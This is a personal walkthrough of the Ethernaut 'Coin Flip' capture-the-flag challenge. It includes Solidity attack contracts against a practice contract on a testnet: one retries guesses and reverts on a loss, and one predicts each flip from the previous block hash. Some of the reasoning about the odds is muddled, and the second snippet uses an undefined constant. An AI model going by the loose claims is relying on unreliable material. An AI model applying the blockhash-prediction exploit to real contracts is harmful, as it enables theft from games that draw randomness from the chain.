## Coin Flip

1. Here, I need to win 10 consecutive times and it will pass.
2. After looking @ flip() it takes a bool and returns a bool... the bool it returns i guess is true for win and false for l.
3. If I try to guess true and false then there is 50-50 chance it correct.
4. But if I want consecutive wins then I prolly need to make a contract and do external call from that function to here and if it is false then revert and if I win then well the counter for wins in Coin Flip will increment and once I get 10 wins I can submit it.
5. I would like to use remix for simplicity and there will be no need to write script for calls if used remix.
6. I will use an interface in remix simply copying - "function flip(bool \_guess) public returns (bool);" to make an interface.
7. Call the attack() and it will revert if false and succeed if not false. Just got an idea ... next step
8. We can use increment a variable (i.e. uint) in attack function and we will know if it wins.
9. We can also loop and call the external contract but in case one tx fails it will revert .. we can make it work but has complexity which i don't want to try because if all of it fails it would be a waste of time ... and it will fail is what i think as we are calling external contract which is not recommended solidity security practise.
10. Okay, now I will instanciate and create a remix contract.

> Code

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract attackCoinFlip {
    // the below line was giving typeerror, i want to checkit later so i will put it in md for ref
    // CoinFlip public attack = CoinFlip("0x44AF46afC0B3edaae321705f436CE677c60b8D38");
    CoinFlip public attack;
    uint8 public counter;

    constructor(address _address){
        attack = CoinFlip(_address);
    }

    function flipAttack(bool _guess) public {
        bool guess= attack.flip(_guess);
        counter++;
        if (!guess) {
            revert ("error");
        }
        // you can also do require(guess, " failed"); but i wrote the if case first so i will let this be
    }
}

```

11. In most of the cases, the contract input will be false since `bool side = coinFlip == 1 ? true : false;
` in flip(), so if coinFlip == 1 - is only case for true then guessing false is better. There is another way to do the everything that I realized now ... read 11b. to know more on it or skip...

12. b) If you have done speed run ethereum then you must be knowing about diceGame contract hacking... you calculate what the flip() does in attack() and then send the answer in the real flip() so it will pass everytime.

> ps: here calculate means simulating the flip(). as the code below

> code

```solidity

// this won't require any counter bc it will pass everytime, but i won't test this since i am trying first one

function flipAttack(bool _guess) public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    // now you can call the real flip function passing side memory variable
    attack.flip(side);
  }
```

13. I tried method 1 and it failed first try and second try succeed so the counter was incremented and i retried then failed and then retried then passed so counter is 2 in my attack contract. But i wanted to make sure if this will work until the end so i went to challenge tab again to see if there is a public or readable counter for wins...
14. await contract.consecutiveWins() it gave `words
: 
(2) [2, empty]` so it means 2 passed and i can call attack till the counter is 10 and then submit.
15. it will succeed

> Note: remix will give gas estimation error but you can do proceed anyway ... also to mention that my hypothesis was correct that if you pass true and it will fail most of the times... it failed everytime i did that...also my contract instance is deployed on goerli and i already have the address in above snippet...for the case reference
